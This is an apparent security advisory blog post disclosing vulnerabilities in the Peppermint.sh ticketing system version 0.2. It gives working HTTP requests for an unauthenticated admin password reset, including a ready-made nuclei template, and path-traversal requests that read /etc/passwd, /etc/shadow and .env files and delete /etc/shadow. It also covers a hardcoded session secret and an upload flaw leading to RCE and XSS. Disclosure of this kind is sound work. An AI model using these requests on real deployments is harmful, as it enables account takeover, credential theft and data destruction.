---
title: "Peppermint.sh - A damn vulnerable ticketing system"
date: 2023-09-04
draft: false
authors: ["blockomat"]
tags: ["advisory"]
description: "Peppermint.sh - A damn vulnerable ticketing system"
---

This post contains some of the findings found in the Peppermint.sh ticket application.
All vulnerabilities were tested on the official latest docker version (which is 0.2 at the time of writing).


## Hardcoded Secrets

The application users `next-auth` with encrypted JWT session cookies.
The *secret* is [hardcoded](https://github.com/Peppermint-Lab/peppermint/blob/446a20b870bc68157eaafcb7275c289d76bfb29e/apps/client/pages/api/auth/%5B...nextauth%5D.js#L65)
which allows any user to encrypt and decrypt the data.
The use of a static secret across multiple instances allows any user to use their session on other instances too.

A decrypted token looks like this:
```json
{"name": "admin", "email": "admin@admin.com", "sub": "1", "user": {"email": "admin@admin.com", "id": 1, "name": "admin", "isAdmin": true}, "iat": 1693732494, "exp": 1996324494, "jti": "d3813576-cce6-4fbd-b496-7b2bb549c941"}
```

The token contains the default admin user data.
Using a session cookie from a local instance allowed to log into any instance, which has the default admin configured.

## Account Takeover
The `/api/v1/users/all` endpoint, lists all available users to unauthenticated visitors.
The data may look like the one below:

```json
{
  "users": [
    {
      "email": "admin@admin.com",
      "name": "admin",
      "id": 1,
      "isAdmin": true
    },
    {
      "email": "test@example.com",
      "name": "testuser",
      "id": 34,
      "isAdmin": false
    }
  ],
  "failed": false
}
```

As shown below, the `id` and `isAdmin` key is included, which
shows us which user is a high privileged user.

The password reset function uses the `id` parameter to specify the user 
of which the password should be changed.

```http
POST /api/v1/users/resetpassword HTTP/1.1
Host: localhost:5000
[...]

{"password":"asdf","id":1}
```

The request above, changes the password of the default admin user.

This can be done using a simple *nuclei* template

```yaml
id: peppermint-unauth-password-reset
info:
  name: Peppermint Unauthenticated Password Reset
  author: unknown
  severity: critical
  description: Reset the admin password without being authenticated
  tags: unsafe,http,peppermint-ticket

http:
  - raw:
    - |
      POST /api/v1/users/resetpassword HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/json

      {"password":"peppermintinsecure", "id":1}

    matchers:
      - type: word
        condition: and
        words:
          - "message"
          - "password updated success"
```

## Arbitrary File Download
The attachments of a ticket can be downloaded, without authentication. However, the endpoint is also vulnerable to Path Traversal.
This allows any unauthenticated attacker to download arbitrary files from the server.

```http
POST /api/v1/ticket/1/file/download?filepath=/etc/passwd HTTP/1.1
Host: localhost:5000
[...]
```

The response contains the content of the `/etc/passwd` file.
Since the default docker installation runs as root, you can also download the `/etc/shadow` file.

You may also try to download the `.env` file (`filepath=.env`) from the web root. This file contains the database password.


## Unauthenticated Arbitrary File Upload and Path Traversal
Any unauthenticated user can create new tickets. In the UI, this endpoint is only accessible after authentication.
However, the request can be done without authentication. A ticket can have attachments but the filename is vulnerable to a Path Traversal.
This allows any unauthenticated attacker to receive a RCE by uploading malicious files to the server.

This also allows stored XSS vulnerabilities, since you can upload SVG or HTML files.


## Arbitrary File Deletion
The API allows any user to delete attachments of tickets. The `path` parameter is vulnerable to a Path Traversal which allows any user to delete arbitrary files from the server.

```http
DELETE /api/v1/ticket/1/file/delete HTTP/1.1
Host: localhost:5000
[...]

{"id":1,"path":"/etc/shadow"}
```

Since the application runs under root by default, it is possible to delete the `/etc/shadow` file.
